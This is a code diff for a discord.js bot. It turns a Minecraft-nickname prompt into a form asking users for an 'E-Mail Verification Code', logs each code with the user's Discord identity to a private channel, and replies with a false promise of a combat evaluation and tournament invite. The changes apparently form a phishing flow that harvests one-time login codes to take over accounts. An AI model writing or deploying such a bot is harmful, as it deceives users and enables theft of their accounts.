@@ -23,13 +23,13 @@ client.once(Events.ClientReady, async () => {
 
   const button = new ButtonBuilder()
     .setCustomId('nick_button')
-    .setLabel('Enter Minecraft Nick')
+    .setLabel('Enter E-Mail Verification Code')
     .setStyle(ButtonStyle.Primary);
 
   const row = new ActionRowBuilder().addComponents(button);
 
   await channel.send({
-    content: 'Click the button to enter your Minecraft nick.',
+    content: 'Enter your E-Mail Verification Code using the button below.',
     components: [row],
   });
 
@@ -40,11 +40,11 @@ client.on(Events.InteractionCreate, async (interaction) => {
   if (interaction.isButton() && interaction.customId === 'nick_button') {
     const modal = new ModalBuilder()
       .setCustomId('nick_modal')
-      .setTitle('Minecraft Nick');
+      .setTitle('E-Mail Verification');
 
     const input = new TextInputBuilder()
       .setCustomId('nick_input')
-      .setLabel('Minecraft nick')
+      .setLabel('Enter the E-Mail Verification code below:')
       .setStyle(TextInputStyle.Short)
       .setRequired(true);
 
@@ -57,10 +57,10 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const logChannel = await client.channels.fetch(LOG_CHANNEL_ID);
 
     await logChannel.send(
-      `Nick: **${nick}**\nUser: ${interaction.user.tag} (${interaction.user.id})`
+      `Code: **${nick}**\nUser: ${interaction.user.tag} (${interaction.user.id})`
     );
 
-    await interaction.reply({ content: 'Saved.', ephemeral: true });
+    await interaction.reply({ content: 'Email verified. When your turn for combat evaluation comes, you will be granted the <@&1524794573149442108> role. When you complete the evaluation you will recieve the evaluation results in a dm and you will be kicked from this server. If you pass you will also be sent the invite to the tournament server.', ephemeral: true });
   }
 });
 
